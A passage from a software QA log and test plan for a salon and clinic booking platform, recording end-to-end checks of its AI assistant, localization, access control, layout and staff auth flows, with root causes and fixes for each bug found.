- [x] ~~Multi-turn conversation (does history/context carry across turns once the first-message crash is fixed?)~~ — **history persists visually within one open session, but the assistant does not appear to use prior-turn context to resolve follow-up questions — confirmed as part of e2e-bug.53's scope, not a separate bug.** Confirmed conversation messages accumulate and stay visible in the same scrollable thread as long as the panel/session isn't reset (both turns of a 2-message exchange remained on screen together). Confirmed conversation state does **not** survive a hard page reload or full navigation away and back — reopening the assistant after a fresh page load always starts a brand-new, empty conversation (no persistence via localStorage/sessionStorage for chat history). For the actual multi-turn *understanding* question: sent `"Do you offer facemassage services"` (got the broken `consumer-tabs` fallback, per **e2e-bug.53**) followed immediately by `"How much does it cost"` in the same open session — a reasonable customer would expect "it" to resolve to "facemassage" from the immediately preceding turn, but this follow-up **also** fell straight through to the identical `consumer-tabs` fallback rather than attempting any contextual resolution. Given turn 1 itself never successfully classified, this isn't a clean test of context-carrying in isolation — a true test would need turn 1 to be a *successful* response with a clear referent, which the current e2e-bug.53 breakage makes hard to set up organically. Recommend re-testing this specific question once e2e-bug.53 is fixed, using a first turn that's known to succeed (e.g. "I want to book a facemassage" → does a follow-up like "make it 2pm instead" correctly adjust the already-identified service/slot, or start over from scratch?).
- [x] ~~Assistant-driven navigation (`consumer-assistant-navigate.util.ts`) actually landing on the right page for a few different intents (book a service, buy a gift card, check a booking)~~ — **1 of 3 works correctly; the other 2 surfaced real bugs, one of them severe (new e2e-bug.51) and directly connected to the already-tracked guide-content corruption (e2e-bug.46).** Tested live via the real AI assistant chat, reading each request's actual `POST /assistant` response body to see the exact `action`/`navigate` field returned, not just the rendered bubble. Note: none of today's ~6 assistant round-trips hit **e2e-bug.1**'s first-message crash (consistent with that bug's own finding that a second request in the same warm process succeeds — this process had been running the whole session).
  - **"Book a service"** (`"I want to book a facemassage"`) — **works correctly.** Landed exactly on `BookPage` for the right service (`/s/:slug/book/cd586065-...`) with a pre-selected date and slot already applied and the confirm step at "100%" — a real, complete, correct handoff.
  - **"Buy a gift card"** — **mixed: the plain phrasing correctly stays informational (no bug), but the natural "for a friend" gifting phrasing triggered a severe misclassification (**e2e-bug.51 — Fixed**, see Fix log).** Plain `"I want to buy a gift card"` correctly returned a quote-only response (`action` reporting available presets) with no navigate — reasonable, since there's a dedicated `buy_gift_card_for_someone` intent for the actual "go buy/gift one" case, and this generic phrasing doesn't match its trigger cues. But the natural way a real customer would ask for that — `"I want to buy a gift card for my mom"` — returned: `{"success":false,"action":"apply_gift_card_code","summary":"Specify gift card code to apply at checkout.\n\n<garbled Armenian>","guide":{"topicId":"consumer-tabs",...,"navigate":{"path":"home"}}}`. **Three compounding problems in one response:** (1) completely wrong intent — `apply_gift_card_code` is for *redeeming* an existing code at checkout, not buying a new gift card for someone, so it immediately fails (no code provided); (2) the failure's fallback grabs an entirely unrelated guide topic (`consumer-tabs`, the "Home/Services/Account tab navigation" walkthrough) and renders it as the assistant's answer to a gift-purchase request, styled as an **error card** (pink/red) in the chat UI; (3) that fallback guide content is the **exact same corrupted, Latin-transliterated-Armenian text already tracked as e2e-bug.46** (`"Ահա ինչպես գlխavar, ծառayutyunner ev հashiv..."`) — this is the first live confirmation that e2e-bug.46's corruption isn't confined to the static `GuidePage`, it's baked into a server-side guide corpus the AI assistant pulls from directly, so it leaks into live chat responses too. And even the wrong-topic `navigate.path` only points to `home`, not anywhere gift-card-related — so a customer who clicked through would land nowhere useful regardless. **Root-caused precisely** (via a dedicated research pass): the real, dedicated intent for this exact phrasing already exists and its classifier (`hasGiftCardForSomeoneCue` in `ai-buy-gift-card-for-someone.util.ts`) genuinely matches `"...gift card for my mom"` — the bug is that the correction never runs. The initial LLM call mis-tags the action as `apply_gift_card_code`; because that's a *recognized* action (not `'unknown'`), `ai-intent-rescue-pipeline.util.ts:85-91` routes it through `runRescueClassifiedPhase` → `disambiguateMisclassified` → `disambiguateGiftCardPaymentsAction` (`ai-gift-card-payments-hints.util.ts:117`) instead of the `runRescueUnknownPhase` path that would have caught it. That disambiguator's very first check, `ai-gift-card-payments-hints.util.ts:154` (`if (isGiftCardPaymentsAction(action)) return null;`), bails out immediately since `apply_gift_card_code` is in `GIFT_CARD_PAYMENTS_ACTIONS` — it never checks whether the prompt actually belongs to `buy_gift_card_for_someone` first, and the file doesn't even import `hasGiftCardForSomeoneCue`. This is the exact same "generic catch-all wins before the narrow, correct classifier gets a chance" pattern already fixed multiple times elsewhere this session (e.g. **ai-cmd-ext-2.25.1**) — and this file is missing the guard that sibling functions `isBuyGiftCardPrompt`/`isBuyGiftCardPhysicalPrompt` (`ai-payments.util.ts:386,396`) already have. **Fix direction:** add `if (hasGiftCardForSomeoneCue(prompt) && action !== 'buy_gift_card_for_someone') return { action: 'buy_gift_card_for_someone', rescueReason: 'gift_card_for_someone' };` at the top of `disambiguateGiftCardPaymentsAction`, before the existing short-circuit — mirrors the established fix pattern exactly. Separately, once e2e-bug.46's content-corruption fix lands, this specific garbled-text symptom goes away too, but the misclassification itself needs its own fix regardless.
  - **"Check a booking"** (tried both `"Check my upcoming appointment"` and `"Show me my appointments"`) — **correctly classified (`action: "my_appointments"`), but never navigated anywhere — **e2e-bug.52 — Fixed** (see Fix log).** Both prompts returned `{"success":true,"action":"my_appointments","summary":"You have 19 appointment(s) on record."}` with **no `navigate` field at all**, confirmed by inspecting the raw response body both times. The chat shows a bare count and nothing else — no button, no chip, no automatic handoff to the Account page where the actual bookings live — so a customer who asks the assistant to "check" their booking gets a number with zero way to actually see or act on it without manually leaving the chat and tapping the Account tab themselves. `buildConsumerAssistantHref`'s `path: 'account'` case (`consumer-assistant-navigate.util.ts:115-119`) already exists and works (used correctly elsewhere, e.g. `ai-update-my-profile`'s email-fallback handoff, per **e2e-bug.40**'s writeup) — `my_appointments`'s handler on the backend simply never sets a `navigate` field to point at it. **Fix direction:** have the `my_appointments` response include `navigate: {path: 'account'}` (or a more specific bookings-scoped path/query if one exists) so the summary text is paired with an actual way to get there, matching the pattern already used by other summary-plus-handoff intents.

#### Cross-cutting, whole-app concerns (carried over from the previous plan, restated here for completeness)

- [x] ~~Auth/IDOR boundary tests (per-endpoint, but now also verify the *UI* doesn't leak another customer's data if an ID is manipulated in the URL, e.g. `/account?subscriptionId=<not-mine>`)~~ — **confirmed clean, no bug found.** Traced the code pattern first: every AccountPage query param that references an owned resource by raw ID (`subscriptionId`, `reviewBookingId`, `supportBookingId`, and siblings) is used purely to `.find()` a match within data **already fetched from the customer's own authenticated endpoint** (`fetchMySubscriptions`/`fetchMyBookings`, both server-scoped to the session's customer) — never as an independent fetch-by-ID. So a foreign ID simply can't match anything in the array; there's no code path that could leak it. Live-verified with a real foreign ID: navigated to `/account?tab=subscriptions&subscriptionId=<a different customer's real subscription id>` while signed in — the page correctly showed only my own subscription ("Monthly Massage Plan"), with the foreign ID's card nowhere in sight and no auto-expand triggered (confirmed via the raw `GET /me/subscriptions` response — the backend returns exactly one row, scoped to the authenticated customer, so the foreign subscription is never even sent to the client to potentially render). Separately tested the architecturally-different guest-token case (`ManageBookingPage`, ownership enforced by token match rather than session): fetched a real booking+token pair for one customer, then requested it with a *different* customer's token (`bookingId` A + `token` from booking C) — correctly rejected with `403 "Invalid or expired manage link"`; the matching correct pairing works normally. Both the session-scoped and token-scoped access patterns hold up under direct URL manipulation.
- [x] ~~Locale UI rendering in `hy`/`ru` across every page above, not just spot-checked~~ — **2 new bugs found, one of them a big one (e2e-bug.54): several whole pages/components never localize at all, plus the persistent bottom tab bar has 3 permanently-hardcoded labels visible on every screen.** First ran a systematic completeness check on `consumer-copy-catalog.ts` itself (rather than manually clicking every page): parsed all three locale blocks and confirmed **zero missing keys** — all 561 EN keys have HY and RU counterparts — and ran the same corruption-detection heuristic used for **e2e-bug.46** against the HY and RU blocks: 0 real hits in RU, and the 19 HY hits were all false positives (correct Armenian grammar attaching case suffixes to intentionally-untranslated brand names, e.g. `"Google-ով"` = "with Google" — a normal, correct construction, not corruption). So the copy catalog itself is clean in both locales. **e2e-bug.54 — Fixed** (see Fix log). Originally: several entire components/pages bypassed the copy-catalog system completely and rendered hardcoded English text regardless of locale, most severely the persistent bottom tab bar and the sign-in page. Found via static search for literal JSX text not wrapped in `copy.xxx`, then live-confirmed the two most severe instances: (1) **`SalonBottomTabBar.tsx`** (lines 33/41/74, `"Home"`/`"Book"`/`"Account"`) — this bar renders on every single tab page in the app, and unlike its sibling labels (`copy.myLabToBookTab`, `copy.myResultsTab`, which correctly localize), these three core labels are bare string literals. Live-confirmed: switched locale to Armenian, then did a **hard reload** (to rule out the already-known stale-render issue, **e2e-bug.22**) — the rest of `SalonHomePage` correctly re-rendered in Armenian ("Rewards & offers" → "Պարգևներ և առաջարկներ", etc.), proving the reload+locale-application mechanism itself works — but the tab bar still showed **"Home" / "Book" / "Account"** in plain English, confirming these three specific strings are hardcoded and will never localize under any circumstance, not just a caching lag. (2) **`LoginPage.tsx`** has zero `copy` usages anywhere in the file — live-confirmed with locale set to Armenian: the entire sign-in screen ("Sign in" header, "Sign in to save appointments at this salon. Guest bookings made with the same email or phone are merged automatically.", "Continue with Google") rendered fully in English. This is the literal account sign-in flow — unavoidable for any customer who wants to save a booking or manage an appointment — completely unlocalized for Armenian- and Russian-speaking users. **Also found via the same static pass, not yet live-verified individually but same bug class/high confidence given the identical zero-`copy`-import pattern:** `WelcomePage.tsx` (the app's home/entry screen — heading "Book your salon", subheading, "Book again"/"Your salons" section titles, salon-code field + placeholder, "Continue" button — almost entirely hardcoded), `ConsumerTenantSwitcher.tsx` (the "Switch salon" modal — title, close button, aria-labels, zero `copy` usages), `ConsumerCheckoutContactForm.tsx` ("Your name" field label), and `ConsumerLanguagePicker.tsx`'s own `aria-label="Language"` (the locale switcher itself isn't fully localized). **Fix direction:** add the missing `copy.xxx` keys for all of the above (values already largely exist as patterns elsewhere in the catalog to copy from) and wire each component through `useConsumerCopy`; prioritize `SalonBottomTabBar` and `LoginPage` given their reach (every page / the entire sign-in flow respectively). Recommend a lint rule or codemod-assisted sweep afterward, since this was only caught by an explicit static-text search — the existing per-page spot-checks earlier this session had missed all of it.
- [x] ~~Responsive layout at `mobile`/`tablet`/`desktop` presets (this session used a fixed viewport throughout — never checked tablet/desktop breakpoints)~~ — **one real bug, e2e-bug.55 (no desktop/tablet breakpoint at all — the mobile card UI stretches edge-to-edge at any width); one false alarm ruled out via DOM introspection, not an app bug.** First hit what looked like a broken tablet render: at a 768×1024 preset viewport, the screenshot showed the app's content confined to a narrow ~445px column with the rest of the viewport rendered as solid black. Before reporting it, verified against the actual DOM rather than trusting the screenshot: `document.querySelector('ion-app').getBoundingClientRect()` and computed styles showed `ion-app`/`body`/`html` all correctly at `width: 768px`, `position` and `transform` normal, no `max-width` constraint anywhere — the real page was rendering full-width with zero black space. Re-tested the identical 768×1024 dimensions via explicit `width`/`height` params (no `preset`) and got a normal, correct full-width screenshot; re-tried the `preset: "tablet"` param again and the black-bar artifact reappeared, reproducibly. Conclusion: this is a rendering/capture quirk specific to this test harness's `preset` viewport-emulation path (likely tied to the `devicePixelRatio: 2` it sets, which a plain width/height resize doesn't), not a defect in the consumer-app itself — not filing it as an app bug. **e2e-bug.55 — Fixed** (see Fix log). Originally: consumer-app had no tablet/desktop breakpoint — at 1280px the mobile card UI stretched edge-to-edge with no centered column.
- [x] ~~Dark mode (`prefers-color-scheme`) — never toggled~~ — **no bug: the app deliberately does not implement dark mode, and does so safely (no broken/half-dark rendering).** Toggled `prefers-color-scheme: dark` via the test harness and loaded the salon pages fresh. Confirmed via `document.styleSheets` enumeration that there are **zero** `@media (prefers-color-scheme: dark)` rules anywhere in any loaded stylesheet (`darkRuleCount: 0`) — dark mode is simply not implemented, not a partially-broken implementation. Critically, confirmed the app isn't silently relying on the browser's automatic dark-mode UA styling either: `document.querySelector('meta[name="color-scheme"]').content` is explicitly `"light"` — a deliberate opt-out that forces browsers to keep native form controls, scrollbars, etc. in light styling regardless of OS/browser dark-mode preference, which is exactly the right way to *not* support dark mode without risking mismatched native-control theming. Live element-level checks (`getComputedStyle` + `elementFromPoint` at several screen coordinates) confirmed every real DOM element renders its normal light-mode colors (white cards, dark text, light-gray section backgrounds) even with the OS-level preference set to dark — matching expectations for a light-only app. One screenshot during this test showed a large solid-black band across part of the page; investigated it directly rather than assuming a bug and found it was the same category of capture-tool artifact as e2e-bug.55's ruled-out tablet finding — every element underneath that exact screen region, when queried via `elementFromPoint`, reported correct light-mode background colors (`rgb(255,255,255)`, `rgb(229,231,235)`), so the black band was never actually part of the rendered page. No further action needed; this is an intentional, correctly-guarded design choice, not a defect.
- [x] ~~Systematic hard-load of all 24 routes directly (not via in-app nav) to find more `IonRouterOutlet` mismatches beyond `/book/any`~~ — **already fully covered earlier this session, just re-listed under slightly different wording ("24 routes" vs. the actual 26) — no new testing needed, re-verified rather than re-run from scratch.** The prior pass (see "Systematic route sweep" a few lines above, in the `consumer-app` remaining-cases list) hard-loaded all 26 real route entries in `App.tsx` and found 3 bugs: **e2e-bug.14** (a one-time "Maximum update depth exceeded" render burst on cold load, root-caused to something shared at the `App.tsx` root rather than any specific page — later corrected/broadened in its own writeup after also reproducing on `WelcomePage`), **e2e-bug.15** (raw axios error text for an over-duration package), and a guide-flow translation issue folded into **e2e-bug.13**. `/book/any`/`/book/multi` reconfirmed the pre-existing **e2e-bug.7** routing gap; all other 20 routes degrade cleanly with no crashes. Re-verified today rather than trusting the old note blindly: `grep -c "<Route" App.tsx` still returns exactly **26** (confirming the "24" in this checklist item was just an imprecise re-statement, not a sign 2 routes were missed), and nothing about the route table has changed since. No new bugs found on re-check.
- [x] ~~Offline/slow-network handling via `consumer-api-offline.util.ts` at each major mutating step (booking, checkout, cancel)~~ — **e2e-bug.16 — Fixed** (see Fix log). Originally dead code (util built/tested but never attached to axios); now `attachConsumerOfflineAxios(http)` in `public-api.ts` queues allowlisted cancel/reschedule network failures and flushes on success/`online`.

### e2e-test-plan.frontend-web-booking-granular — Deep test case breakdown for `frontend`'s web booking flow (`/book/[slug]/*`)

Continuation of the deep-planning request, now applied to the parallel web implementation flagged in `e2e-test-plan.full` section 3. Unlike the `consumer-app` breakdown (planned from route/page names alone), this one is grounded in actually reading the relevant source files first — which changed the plan meaningfully: several previously-open "does this bug reproduce here too?" questions turn out to have code-level answers already, without needing to run anything.

**Architecture note:** `frontend/src/app/book/[slug]/**/page.tsx` are thin Next.js Server Component wrappers; the real logic lives in `frontend/src/components/public-booking/*-client.tsx` files, calling `frontend/src/lib/public-api.ts` (82 functions — comparable in size to `consumer-app`'s 91, but **a separate, independently-written implementation**, not shared code).

#### Findings from source review (no browser needed for these — stated as expectations to confirm, not open questions)

- [x] **api-bug.1 and api-bug.2 will reproduce here too, by construction — not a real open question.** **Confirmed; no separate frontend fix needed — both backend fixes already cover this client.** Re-checked `frontend/src/lib/public-api.ts`: `reschedulePublicCustomerBooking` → `POST /public/:slug/me/bookings/:id/reschedule`, `reschedulePublicBookingWithToken` → `POST /public/:slug/bookings/manage/reschedule`, `bookPublicPackage` → `POST /public/:slug/packages/book` — identical paths to `consumer-app/src/services/public-api.ts`. **api-bug.1** fix (`BookingService.resolvePhiAuditActor` handles `customer:<uuid>`) and **api-bug.2** fix (`bookPackage` calls `previewTotals` for the duration cap) both live in shared backend service code, so public booking web inherits them automatically. Prior live manage-link confirmation of the pre-fix crash (`/book/[slug]/manage` entry above) further proves shared endpoint identity.
- [x] **e2e-bug.6 (gift-card checkout infinite loop) likely does NOT reproduce here — worth a quick empirical check, but the code looks correct.** **Confirmed: does not reproduce; public web already used the correct pattern.** Source audit of `gift-card-checkout-client.tsx` + `public-customer-auth.tsx`: (1) `customer` comes from `useState` in auth context (stable ref, memoized context value) — not `getStoredCustomerProfile()` re-parsed every render; (2) `serviceIdsFromUrl` is `useMemo`'d (further hardened to depend on primitive query/default ids, not `searchParams` / array identity); (3) prefill `setForm` now no-ops when values are unchanged (same hardening as consumer-app's fix). Quote effect can still re-run on real form edits, but cannot storm from unstable customer/serviceIds deps. No separate bug to file.
- [x] **e2e-bug.2 (CTA hidden behind tab bar) cannot reproduce here at all — different UI paradigm, no shared mechanism.** **Confirmed N/A for public booking web.** Grep of `frontend/src/app/book` finds zero `IonTab`/`salon-tab`/`BottomNav`/`tab-bar` usage — booking surfaces have no bottom nav at all (provider web has its own `provider-nav.tsx`, unrelated). `FixedActionBar` is a Tailwind `fixed bottom-0 z-50` wrapper around a native `<button>` with `pointer-events-auto` on the button only — nothing sits above it that shares the consumer-app Ionic lifecycle failure mode. Overlap spot-check: cookie consent banner is also `fixed bottom-0 z-50` in the book layout, but it intentionally covers the footer until dismissed (consent supersedes CTA) — not a hidden-behind-tabs bug. Added safe-area bottom padding on `FixedActionBar` to match checkout footers so the home indicator cannot clip the button on notched phones.
- [x] **e2e-bug.4 (missing accessible button roles) likely much less prevalent here — worth spot-checking, not assuming.** **Spot-checked; class of bug is not prevalent — native `<button type="button">` is the default.** Audited `components/public-booking/**` + `app/book/**`: ~101 `type="button"` attrs; primary CTAs (FixedActionBar, Services continue, checkout Pay online/cash, account Sign in/out, assistant Send, promo Apply/Remove, specialist picker, day strip, slot grids, gift-card catalog) are all real `<button>`s — no Ionic custom elements / shadow-DOM role gaps. Only non-button `onClick`s found were modal dismiss backdrops in `public-gift-cards-section.tsx` and `consumer-app-banner.tsx` (clickable `div`s); converted both to accessible `<button type="button" aria-label=…>` overlays matching `specialist-picker-sheet.tsx`. No new e2e-bug minted — residual risk is low here.
- [x] **New, `consumer-app` has no equivalent: `cookie-consent-banner.tsx` exists here.** **Test-passed + gaps closed.** Accept/reject persist per-slug in `localStorage` (`cookie-consent-<slug>`); revisit with a stored choice does **not** re-prompt (`shouldShowCookieConsentBanner`). Declining blocks non-essential tracking via `allowsNonEssentialTracking` → `app-analytics` (drops queue + no further events) and product-recommendation analytics. Accept mid-session calls `syncAnalyticsConsentFromCookies` so the in-memory gate updates without reload. Banner disabled → tracking allowed (no prompt required). Wired `PublicAnalyticsBootstrap` so public web actually configures analytics (previously `configureAppAnalytics` was never called in production, making the consent gate a no-op). Specs: `cookie-consent.spec.ts`, `cookie-consent.integration.spec.ts`, `app-analytics.spec.ts`, `product-recommendation-analytics.spec.ts`.

#### Page-by-page cases (nothing executed yet — full fresh walkthrough needed regardless of the above)

- [x] ~~`/book/[slug]` (home) — discovery/landing page equivalent of `consumer-app`'s salon-home tab~~ — **tested live end-to-end, no bugs found; one interesting non-bug worth recording.** Loaded `/book/gevgas-operations-7c299253` fresh: business name/address, tagline ("Best service"), and description all render correctly; the "Any available specialist" card and a per-provider list (each showing name, role, star rating + review count, and a live grid of next-available time slots for today) all loaded correctly from `GET .../services`/`GET .../providers` with zero console errors. Clicking a specific time slot on a provider's card correctly highlights both that slot and selects the provider (radio fill), and clicking "Select service" correctly carries both selections forward as `?employeeId=...&startTime=...` query params into `/services` — a clean, correct handoff. Business-name link → `/profile` navigates correctly (not deep-tested here, out of scope for this pass). **Investigated one thing that looked like a dead button but turned out not to be an app bug**: clicking "Sign in" in the header (verified via a real DOM `.click()` call, not just a screenshot-coordinate click, to rule out a coordinate-mapping artifact) produced no visible change — no popup, no redirect, no console error, no new tab. Traced the full call chain (`public-header.tsx:105` → `usePublicCustomerAuth().signInWithGoogle()` → `getPublicGoogleIdToken({slug, forcePopup:true})` in `public-google-auth.ts:189-230`) and confirmed this is actually a **well-designed fallback chain**: it tries `signInWithPopup` first, and on `auth/popup-blocked` (the expected failure mode in this sandboxed browser tool, same as **e2e-bug.44** hit for `consumer-app`) it automatically falls back to a full-page `signInWithRedirect` to Google's real OAuth screen (`startPublicGoogleSignInRedirect`, line 127-140) — and the header's `catch` block correctly recognizes this as an expected "now redirecting" state (`isPublicGoogleSignInRedirecting`) rather than a real error, suppressing the console.error by design. The reason nothing visibly happened is that this test harness's sandboxed browser can't complete a real cross-origin navigation to `accounts.google.com` — an environment limitation (same category as this session's earlier `resize_window` screenshot artifacts), not a defect in the app. Notably, this fallback chain is **more robust than `consumer-app`'s equivalent `LoginPage`**, which has no popup→redirect fallback at all and just surfaces the raw Firebase error string (**e2e-bug.44**) — worth using as the reference pattern if/when e2e-bug.44 gets fixed.
- [x] ~~`/book/[slug]/services` — service selection, single vs. multi-select, category grouping~~ — **tested live end-to-end via two different entry paths, no bugs found.** (1) **Provider-scoped entry** (from the home page's per-provider slot selection): correctly loads `ServicesPage` (`app/book/[slug]/services/page.tsx`) with `employeeId`+`startTime` in the URL, showing only that provider's own services grouped under their one category ("Massage" for the test provider), plus a working "Ask the assistant" prompt-suggestion box. Confirmed via source (`page.tsx:25-27`) that this route **requires** both params and does a hard server-side `redirect()` to `/professionals` if either is missing — reproduced live (bare-loading `/services` with no query params does redirect to the specialist picker, no crash, no blank page) — this is deliberate routing by design, not a bug. (2) **Full-catalog entry** (via the home page's "Any available specialist" card, which routes to the sibling `/any` page): correctly shows **all** of the business's real categories together — a "Packages" section first (showing the bundled "Massage Package" with its 15%-off price, strikethrough original price, and an expandable "View included services" list), then "Face Care," "Hair Care," and "Massage" sections each correctly grouping their own services with name/description/duration/price. **Multi-select tested and correct**: checked one service from "Hair Care" (hair coloring) and one from "Massage" (Deep tissue massage) — both highlighted correctly, the bottom button's label correctly updated from "Select date & time" to "Continue with selected services." Continuing correctly computed a running total (2h 35min · $220.00) on the next step and — since no single specialist actually performs both a hair service and a massage — correctly surfaced a clear, appropriately-worded **"No provider can perform all selected services"** warning with the date/time picker showing "No available times on this day," and the "Continue to checkout" button confirmed genuinely disabled (a real `.click()` on it produced no navigation, URL unchanged). This cross-category edge case is handled gracefully, not a bug — a real customer gets clear, honest messaging rather than a confusing crash or a silently-broken checkout.
- [x] ~~`/book/[slug]/professionals` — provider list + ratings~~ — **tested live, no bugs found.** All 4 real employees for this business rendered correctly: `Gevorg Gasparyan` (Massage specialist, 3.5★ · 6 reviews, full grid of real time slots), and 3 zero-review employees (`Jujo Karapetyan` — Hair specialist, `Karo Mazmanyan` — Cosmetologist, `Mariam Ohanyan` — role literally "Permanent + Alexandrite," confirmed via direct API call to be the real stored `role` string for that employee, not a display bug), each correctly showing "No available slots in the next two weeks" instead of an empty/broken slot grid. Confirmed via `GET .../providers` that employees with `reviewCount: 0` correctly get **no** star-rating row rendered at all, rather than a misleading "0.0 (0 reviews)" — good defensive UI, not a bug.

Temporarily flipping one real booking to `completed` with a manually-set `reviewToken` (mirroring exactly what `ensureReviewToken()` would generate) unblocked the full flow: the page correctly rendered a star picker + comment box + provider/service summary, correctly submitted a real review row to the DB, correctly showed a "Thank you for your review!" confirmation, and correctly kept showing that same confirmation (not the form again) on a reload — clean duplicate-prevention. **On the UX-pattern comparison**: a dedicated full-page route (this app) vs. `consumer-app`'s in-context modal are both reasonable choices — this page's version has the edge for an emailed/texted post-visit link specifically (a modal has nothing to attach to when the customer arrives from a cold link in their inbox, so a standalone page is the more correct pattern for *that* delivery channel), while a modal makes more sense for an in-app prompt shown right after a live visit. Not a case of one being better, they suit different trigger origins. **e2e-bug.59 — Fixed** (see Fix log). Originally: review page always showed a zero-length time ("10:35–10:35") because `formatBookingDateTimeRange(when, when)` reused start as end — `PublicReviewContext` only returned `appointmentDate`.
- [x] ~~Session/auth handoff between this web app and `consumer-app`~~ — **confirmed via source: no handoff exists at all — the two apps have fully independent, incompatible session stores, and the `/get-app/[slug]` bridge is purely an install/deep-link mechanism, not an identity bridge. Matches the checklist's expectation exactly; not a bug, but worth having confirmed rather than assumed.** This frontend (`public-customer-auth.tsx`) stores its customer JWT under `localStorage['public-customer:<slug>']`; `consumer-app` (`customer-auth.ts`) stores its own, independently-minted JWT under a completely different key format via its own `tokenKey(slug)` helper — and since these are different origins entirely (a web domain vs. a native app's isolated webview storage, or different dev ports locally), `localStorage` itself is never shared between them regardless of key naming. Each app independently calls its own `loginPublicCustomer(slug, idToken, ...)` against the shared backend after its own separate Google sign-in — so even though both ultimately authenticate the same real customer, each produces and stores its own session token with zero cross-awareness. **Confirmed `/get-app/[slug]` (`get-app-client.tsx`) does not attempt any identity/token handoff**: its entire job is (1) `saveDeferredInstallLink()` — persisting install-attribution metadata (`slug`, `serviceId`, `installSource`, `campaign`) for post-install analytics only, and (2) redirecting to the platform-appropriate app-store URL or the `optischedule://book/:slug` custom scheme — no session token, code, or exchange mechanism is passed through the deep link at all. **Net answer**: a customer who signs in on the web booking flow and then opens/installs the native app (or vice versa) will be prompted to sign in again from scratch — expectations and reality match, this is a real, working limitation rather than a broken promise, since nothing in the actual UI (checked both apps' sign-in copy) claims otherwise. Worth flagging as a product/UX opportunity (a proper SSO or short-lived handoff-token exchange through the `/get-app` deep link would remove this friction) rather than a defect to fix.

### e2e-test-plan.dashboard-clinic-vertical — Fresh clinic business + staff auth flows + lab-queue/specimen-ops gating

Registered a brand-new dashboard account and business (`QA Test Clinic`, `qa-test-clinic-2026@example.com`) specifically to test the clinic vertical end-to-end, since the existing test business (`gevgas-operations-7c299253`) is a salon, not a clinic. This surfaced 4 real bugs — two of them severe, platform-wide, and not clinic-specific at all — plus confirmed the 2 requested checklist items. All test data created purely to enable this pass (the extra business, its `businessType` DB override, the temporary invitation attempts) is either disposable (a throwaway test business) or was already transient (failed invitation attempts create no rows since the endpoint 500s before insert).

- [x] ~~Create a new business in dashboard as a clinic, test clinic-related features~~ — **done; surfaced e2e-bug.60, a real onboarding bug, plus set up the environment needed for the rest of this section.** Registered via `/register`, selected "Clinic" ("General practice, laboratory, and specialist departments") on the onboarding business-type step, then clicked **"Skip for now"** (a realistic choice — a real owner who wants to build their own catalog rather than accept AI-generated services). **e2e-bug.60 — Fixed** (see Fix log). Originally: "Skip for now" discarded the business-type selection (only `/onboarding/complete`, never `/onboarding/business-type`), so clinic/etc. vertical was never persisted after skip. Worked around during testing with a one-off DB `settings.businessType = "clinic"` update.

- [x] ~~`dashboard/lab-queue`, `dashboard/lab-specimens/collection`, `dashboard/lab-specimens/tracking` — clinic vertical only, same gating check~~ — **e2e-bug.61 — Fixed** (see Fix log). Originally: all 3 lab pages were unconditionally inaccessible after login/register because auth never returned `business.settings.businessType` (most severe finding of this pass). Even after directly confirming `settings.businessType = "clinic"` in the database (working around e2e-bug.60) and doing a full fresh login, all 3 pages still showed: *"Lab orders, results, and specimens are only available for clinic vertical business types (clinic, polyclinic, beauty_clinic, dental)."* Root-caused precisely: all three pages (`lab-queue/page.tsx:46-48`, `lab-specimens/collection/page.tsx:11-13`, `lab-specimens/tracking/page.tsx:11-13`) gate on `business?.settings?.businessType` read from `useAuthStore()` (Zustand) — but the `business` object this store holds is **never populated with a `settings` field at all**, for any account, ever. Confirmed by inspecting the backend's actual `/auth/login` and `/auth/register` response shape (`auth.service.ts:412-434`, `toAuthResponse()`): the `business` object it returns is deliberately slim — `{ id, name, slug, ...localeFields, membershipRole }` — `localeFields` only extracts locale/currency/date-format fields from `settings`, never the full object, and `businessType` is never included at all. Grepped every `setAuth(...)` call site in the frontend (`register`, `login`, `provider/login`, `business-switcher`) — **none of them ever populate `business.settings`**. The **only** code path that does is `dashboard/business/page.tsx:66` (`onSuccess` of saving the Business Profile page), because that endpoint's response happens to return the full business entity. Confirmed live: visiting Business Profile and clicking **"Save profile"** (with no actual changes) immediately populated `business.settings.businessType` in the store, and reloading the 3 lab pages then rendered them correctly — full filter UI (order/specimen status, department dropdown listing General Practice/Laboratory/Cardiology/Imaging/Dental/Dermatology, date range) and correct empty states ("No lab orders match the current filters," etc.). **Net effect: every clinic-vertical business in this app has its entire Lab Queue / Specimen Collection / Specimen Tracking feature set silently broken immediately after login or registration, recoverable only by an undiscoverable workaround (visit Business Profile and click Save at least once per session) that no real user would ever stumble into.** This is not a clinic-specific edge case — it reproduces identically for every business type, since the root cause (an incomplete auth-response payload) has nothing to do with vertical. **Fixed:** auth login/register/switch/me now include a safe `settings: { businessType }` slice; lab pages/layout resolve type via `useDashboardBusinessType` (auth store + shared `business-profile` fallback for stale sessions).

- [x] ~~`(auth)/login`, `(auth)/register`, `(auth)/accept-invite`, `(auth)/set-password` — staff auth flows~~ — **register and login work correctly; accept-invite and set-password work correctly for their negative/error paths but positive-path testing was blocked by a separate severe bug (e2e-bug.62/api-bug.8) discovered along the way; both pages also reproduce a systemic raw-error-text bug (e2e-bug.63) affecting error handling dashboard-wide.** `register` (`/register`): filled out first/last name, business name, email, password — correctly created the account, business, and owner membership, and correctly redirected to `/dashboard/onboarding`. `login` (`/login`): correctly signed back in with the fresh credentials and redirected to `/dashboard`. `accept-invite` (`/accept-invite`): with no `token` param, correctly shows a clean "Invalid invitation link" message with a working "Sign In" link (no crash); with a garbage/nonexistent token, correctly attempts a real lookup and fails cleanly (see e2e-bug.63 below for the exact text shown). Could not test the **positive** path (a real invite email → fill in name/password → land in the new account) because sending an invitation is completely broken: **e2e-bug.62 (dashboard) / api-bug.8 (backend) — Fixed** (see Fix log). Originally: `POST /businesses/:id/invitations` always failed with a 500 because `assertEmailAvailableForInvite` used raw QueryBuilder `employee.is_active` while the Postgres column is camelCase `"isActive"`. `set-password` (`/set-password`, used for the provider/mobile-app password flow): with no token, correctly shows a clean "This link is invalid or has expired." message; with an invalid token, attempts a real lookup and fails — see next finding. **e2e-bug.63 — Fixed** (see Fix log). Originally: `getErrorMessage()` (and toast `extractErrorMessage`) preferred axios `Error.message` ("Request failed with status code …") over Nest `response.data.message` / translated fallbacks.
